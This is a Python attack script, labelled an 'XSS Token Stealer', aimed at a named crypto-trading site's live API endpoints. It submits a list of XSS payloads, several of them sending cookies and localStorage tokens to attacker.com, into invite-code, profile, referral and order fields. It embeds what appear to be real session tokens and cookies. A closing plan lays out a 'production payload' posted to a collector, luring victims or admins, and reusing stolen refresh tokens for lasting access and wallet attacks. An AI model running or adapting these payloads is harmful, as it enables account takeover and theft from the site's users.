#!/usr/bin/env python3
"""XSS Token Stealer - Test injection vectors on gmgn.ai to steal localStorage tokens.

From your research:
- Tokens stored in localStorage: account_token_${accountId}
- Contains: access_token, refresh_token, trade_token
- sid cookie NOT httpOnly (stealable via document.cookie)
- XSS confirmed via invite_code accepting {{7*7}} without validation
"""
import json
import requests

# Fresh token
ACCESS_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL2FjY2VzcyIsImRhdGEiOnsidXNlcl9pZCI6IjhhNGMzZDYzLTg4ZmEtNDZjYy05ODRhLWU4ODVkNGFmZDFiNSIsImNsaWVudF9pZCI6ImdtZ25fd2ViXzIwMjYwNzEwLTE5NzItOWY0OWM4ZiIsImRldmljZV9pZCI6ImFjZjg5OGM3LTUwNjMtNGQwZi1iOTkyLWQxZTVkNTY4NDA5ZSIsImZhdGhlcl9pZCI6ImUzZDg1ZjU5LWMxMDUtNDA0My1hMDYwLTlhNmYxMGU3OWVmNyIsImZpbmdlcnByaW50IjoidjFmMTYwODU4OWNmZDU3Yjk1MDQzNDVhYTgyZGNlYTQxMiIsImFwcCI6ImdtZ24iLCJwbGF0Zm9ybSI6IndlYiJ9LCJleHAiOjE3ODM4NzE2MTMsImlhdCI6MTc4Mzg2OTgxMywiaXNzIjoiZ21nbi5haS9zaWduZXIiLCJqdGkiOiIyNzVjNDgxNi0zMTJhLTRkOTgtYjU5NS00MGZkZWIzNTZmNzMiLCJuYmYiOjE3ODM4Njk4MTMsInN1YiI6ImdtZ24uYWkvYWNjZXNzIiwidXNlcl9pZCI6IjhhNGMzZDYzLTg4ZmEtNDZjYy05ODRhLWU4ODVkNGFmZDFiNSIsInZlciI6IjEuMCJ9.cKAQOL6yZqDKvwRKCN1v7BaH_9MEFXrRYf-ywEbM5wBzqwm6fj8OOJNKg2kxr9HJ3Qrc1WHR5eZoX9YJWoNjsg"

COOKIES = {
    "_ga_UGLVBMV4Z0": "GS1.2.1783868828922928.d557456dab82a63259179cf5603c7cb8.2et19uuic9LyMBph5Cx3hQ%3D%3D.mIlh9tL7rCIb2reoLkDLSA%3D%3D.NPARXjz5FNHX6j%2BVfQ4NyQ%3D%3D.V7iy1IQ16P92AotWIN9BjQ%3D%3D",
    "__cf_bm": "j_lS0Oscc4a0_D5Yn.nzhtaJpsJLgahl.qF9h1fJUuA-1783868831.6090767-1.0.1.1-iGgjPq_FDdPkkmhVdjThsxiacp4AYJCX5UtvDc4_w0LLXNqxGSlKq9EikgRmFAJSDr9Wc1NcKC1YhLPmejETCneXHyynzrMdC25Wbfm2NgnaqgV.M_rPFnN.poiDuvkC",
    "_ga": "GA1.1.1499118900.1783283677",
    "_csrf": "zp-fQVg4uAYlEsx7cronE5kO3GM4xIln",
    "_did": "c800ab0b7d01aa37bc93aacdcbce271e",
    "_wt": "AWpa2MXrjj0uvG6i4MZw3ZLOqVnU803QqMIf1eo",
    "sid": "gmgn|df83ac2f9a7e02144cb10ded0c21ad5c",
}

H = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

# Your wallet for testing
YOUR_WALLET = "0x0000000000000000000000000000000000000001"

print("="*80)
print("🔥 XSS TOKEN STEALER - INJECTION VECTOR TESTING")
print("="*80)
print("\nFrom your research:")
print("  • Tokens in localStorage: account_token_${accountId}")
print("  • invite_code accepts {{7*7}} without sanitization")
print("  • sid cookie NOT httpOnly (accessible via JS)")
print("")

# ============================================================================
# XSS PAYLOADS
# ============================================================================

# Payload 1: Simple image onerror
PAYLOAD_1_IMG = '''<img src=x onerror="fetch('https://attacker.com?'+document.cookie)">'''

# Payload 2: localStorage exfiltration
PAYLOAD_2_STORAGE = '''<img src=x onerror="fetch('https://attacker.com',{method:'POST',body:JSON.stringify({tokens:Object.keys(localStorage).filter(k=>k.includes('token')).map(k=>({key:k,val:localStorage[k]})),cookies:document.cookie})})">'''

# Payload 3: Template injection (already proven to work)
PAYLOAD_3_TEMPLATE = "{{7*7}}"

# Payload 4: SVG-based
PAYLOAD_4_SVG = '''<svg onload="fetch('https://attacker.com?'+btoa(localStorage.getItem('account_token_8a4c3d63-88fa-46cc-984a-e885d4afd1b5')))">'''

# Payload 5: JavaScript protocol
PAYLOAD_5_JS = '''javascript:fetch('https://attacker.com',{method:'POST',body:localStorage.getItem('account_token')})'''

# Payload 6: Event handler
PAYLOAD_6_EVENT = '''"><script>fetch('https://attacker.com?t='+document.cookie)</script>'''

# Payload 7: Encoded
PAYLOAD_7_ENCODED = '''%3Cimg%20src%3Dx%20onerror%3D%22alert(1)%22%3E'''

# Payload 8: Unicode
PAYLOAD_8_UNICODE = '''\\u003cimg src=x onerror=\\u0027alert(1)\\u0027\\u003e'''

# Payload 9: Base64 in data URI
PAYLOAD_9_DATA = '''<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=">'''

# Payload 10: DOM-based
PAYLOAD_10_DOM = '''<iframe srcdoc="<script>parent.postMessage(localStorage,location.origin)</script>">'''

payloads = [
    ("IMG_ONERROR", PAYLOAD_1_IMG),
    ("LOCALSTORAGE_THEFT", PAYLOAD_2_STORAGE),
    ("TEMPLATE_INJECTION", PAYLOAD_3_TEMPLATE),
    ("SVG_ONLOAD", PAYLOAD_4_SVG),
    ("JS_PROTOCOL", PAYLOAD_5_JS),
    ("SCRIPT_TAG", PAYLOAD_6_EVENT),
    ("URL_ENCODED", PAYLOAD_7_ENCODED),
    ("UNICODE", PAYLOAD_8_UNICODE),
    ("DATA_URI", PAYLOAD_9_DATA),
    ("IFRAME_SRCDOC", PAYLOAD_10_DOM),
]

# ============================================================================
# INJECTION VECTORS
# ============================================================================

print("\n" + "="*80)
print("VECTOR 1: invite_code Parameter (PROVEN VULNERABLE)")
print("="*80)

for name, payload in payloads:
    print(f"\n[{name}]")
    print(f"  Payload: {payload[:80]}...")
    
    try:
        r = requests.post(
            "https://gmgn.ai/tapi/v1/fourmeme/bind_invite",
            headers=H,
            cookies=COOKIES,
            json={
                "chain": "bsc",
                "from_address": YOUR_WALLET,
                "invite_code": payload
            },
            timeout=10
        )
        
        print(f"  Status: {r.status_code}")
        
        if r.status_code == 200:
            d = r.json()
            print(f"  ✅ ACCEPTED! Server stored payload!")
            print(f"  Response: {json.dumps(d)[:200]}")
            
            if d.get("code") == 0:
                print(f"  💀💀💀 SUCCESS - Payload stored with code:0")
        else:
            print(f"  Response: {r.text[:150]}")
            
    except Exception as e:
        print(f"  Error: {e}")

# ============================================================================
# VECTOR 2: from_address Parameter
# ============================================================================
print("\n" + "="*80)
print("VECTOR 2: from_address Parameter")
print("="*80)

for name, payload in payloads[:5]:  # Test top 5
    print(f"\n[{name}]")
    
    try:
        r = requests.post(
            "https://gmgn.ai/tapi/v1/fourmeme/bind_invite",
            headers=H,
            cookies=COOKIES,
            json={
                "chain": "bsc",
                "from_address": payload,
                "invite_code": "TESTCODE"
            },
            timeout=10
        )
        
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            d = r.json()
            if d.get("code") == 0:
                print(f"  💀 STORED in from_address!")
                
    except:
        pass

# ============================================================================
# VECTOR 3: User Profile Fields
# ============================================================================
print("\n" + "="*80)
print("VECTOR 3: Profile/Settings Fields (if accessible)")
print("="*80)

profile_fields = [
    ("username", "https://gmgn.ai/account/update_profile"),
    ("bio", "https://gmgn.ai/account/update_profile"),
    ("display_name", "https://gmgn.ai/account/update_profile"),
]

for field, url in profile_fields:
    print(f"\n[{field}]")
    
    try:
        r = requests.post(
            url,
            headers=H,
            cookies=COOKIES,
            json={field: PAYLOAD_2_STORAGE},
            timeout=10
        )
        
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            print(f"  ✅ Accepted!")
            
    except:
        pass

# ============================================================================
# VECTOR 4: Referral Message/Notes
# ============================================================================
print("\n" + "="*80)
print("VECTOR 4: Referral System Text Fields")
print("="*80)

referral_endpoints = [
    ("invite_message", "https://gmgn.ai/defi/quotation/v1/invite/set_message", {"message": PAYLOAD_2_STORAGE}),
    ("referral_note", "https://gmgn.ai/tapi/v1/fourmeme/set_invite_note", {"note": PAYLOAD_2_STORAGE}),
]

for name, url, payload_dict in referral_endpoints:
    print(f"\n[{name}]")
    
    try:
        r = requests.post(url, headers=H, cookies=COOKIES, json=payload_dict, timeout=10)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            print(f"  ✅ Payload accepted!")
    except:
        pass

# ============================================================================
# VECTOR 5: Trading Bot Order Notes/Labels
# ============================================================================
print("\n" + "="*80)
print("VECTOR 5: Trading Bot Order Labels")
print("="*80)

print(f"\n[order_label]")

try:
    r = requests.post(
        "https://gmgn.ai/tapi/v1/trading_bot/limit_order/create",
        headers=H,
        cookies=COOKIES,
        json={
            "chain": "bsc",
            "wallet_address": YOUR_WALLET,
            "label": PAYLOAD_2_STORAGE,  # XSS in label field
            "note": PAYLOAD_1_IMG,       # XSS in note field
            "base_token": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
            "quote_token": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
            "order_type": "buy",
        },
        timeout=10
    )
    
    print(f"  Status: {r.status_code}")
    if r.status_code in [200, 400]:
        print(f"  Response: {r.text[:200]}")
        
except:
    pass

# ============================================================================
# SUMMARY & NEXT STEPS
# ============================================================================
print("\n" + "="*80)
print("📊 XSS INJECTION TESTING COMPLETE")
print("="*80)

print("""
NEXT STEPS:

1. CHECK RESPONSES:
   - Any payload that got code:0 is STORED
   - Server needs to REFLECT it back in HTML/JS for XSS to fire
   
2. FIND REFLECTION POINTS:
   - Referral dashboard (shows invite codes)
   - Profile pages (shows usernames/bios)
   - Order history (shows labels/notes)
   - Admin panels (if they review submissions)
   
3. BUILD PRODUCTION PAYLOAD:
   Once you find a reflection point, use this payload:
   
   <img src=x onerror="
     let tokens = {};
     Object.keys(localStorage).forEach(k => {
       if(k.includes('token')) tokens[k] = localStorage[k];
     });
     fetch('https://YOUR-COLLECTOR.workers.dev/steal', {
       method: 'POST',
       body: JSON.stringify({
         tokens: tokens,
         cookies: document.cookie,
         url: location.href
       })
     });
   ">
   
4. SET UP COLLECTOR:
   - Deploy Cloudflare Worker to receive stolen tokens
   - Or use requestbin.com / webhook.site for testing
   
5. TRIGGER:
   - Get victim to visit page that reflects your payload
   - Admin reviews referral code → XSS fires
   - Tokens exfiltrated to your collector
   
6. PROFIT:
   - Use stolen refresh_token
   - Maintain permanent access
   - Execute IDOR attacks on their wallets
""")

print("\n✅ Test vectors generated. Check which payloads were accepted.")
print("   Next: Find where gmgn.ai DISPLAYS these fields to trigger XSS.")
